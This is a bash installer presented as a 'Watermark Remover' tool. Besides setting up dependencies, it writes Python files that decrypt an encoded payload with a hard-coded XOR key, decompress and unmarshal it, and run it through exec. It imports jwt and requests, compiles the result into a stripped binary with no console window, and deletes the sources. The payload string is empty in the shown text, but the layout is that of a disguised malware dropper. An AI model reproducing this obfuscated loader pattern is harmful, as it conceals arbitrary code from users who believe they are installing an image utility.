#!/bin/bash
G='\033[0;32m'; C='\033[0;36m'; R='\033[0;31m'; N='\033[0m'

echo -e "${C}[*] Watermark Remover - Installer${N}"
echo -e "${C}[*] Detecting system...${N}"

if command -v termux-setup-storage &>/dev/null; then OS="termux"
elif [ -f /etc/arch-release ]; then OS="arch"
elif [ -f /etc/debian_version ] || grep -qi ubuntu /etc/os-release 2>/dev/null; then OS="debian"
else OS="linux"; fi
echo -e "${G}[+] $OS detected${N}"

DIR="$(cd "$(dirname "$0")" && pwd)"; cd "$DIR"

echo -e "${C}[*] Installing system dependencies...${N}"
case "$OS" in
    termux) pkg update -y && pkg install -y python python-pip binutils clang ;;
    arch)   sudo pacman -Sy --noconfirm python python-pip python-pillow python-pyinstaller ;;
    debian|linux) sudo apt update -y && sudo apt install -y python3 python3-pip python3-venv python3-pil ;;
esac

echo -e "${C}[*] Creating virtual environment...${N}"
python3 -m venv venv 2>/dev/null || python -m venv venv

echo -e "${C}[*] Installing Python packages...${N}"
source venv/bin/activate
pip install pyjwt requests pillow pyinstaller -q

echo -e "${C}[*] Generating main.py...${N}"
cat > main.py << 'MAINEOF'
import base64,zlib,marshal,hashlib,os,sys as _s
_p=""
_k=hashlib.sha256(b"DrW4t3rm4rkPhD_2024!@#$%").digest()
exec(marshal.loads(zlib.decompress(bytes([base64.b64decode(_p)[i]^_k[i%len(_k)]for i in range(len(base64.b64decode(_p)))]))))
MAINEOF

echo -e "${C}[*] Compiling to binary (this may take a while)...${N}"
cat > _loader.py << 'LDREOF'
import jwt,requests,PIL,base64,zlib,marshal,hashlib,sys,io,os,random,string,time
_p=""
_k=hashlib.sha256(b"DrW4t3rm4rkPhD_2024!@#$%").digest()
exec(marshal.loads(zlib.decompress(bytes([base64.b64decode(_p)[i]^_k[i%len(_k)]for i in range(len(base64.b64decode(_p)))]))))
LDREOF

./venv/bin/python -m PyInstaller --onefile --noconsole --strip \
  --hidden-import=jwt --hidden-import=requests --hidden-import=PIL \
  --hidden-import=PIL.Image --hidden-import=io --hidden-import=os \
  --hidden-import=random --hidden-import=string --hidden-import=time \
  _loader.py >/dev/null 2>&1

mv dist/_loader dist/main 2>/dev/null
rm -rf _loader.py main.py build __pycache__ *.spec 2>/dev/null

echo -e "\n${G}[✓] Install selesai!${N}"
echo -e "${C}Pemakaian:${N}  ./dist/main gambar.jpg"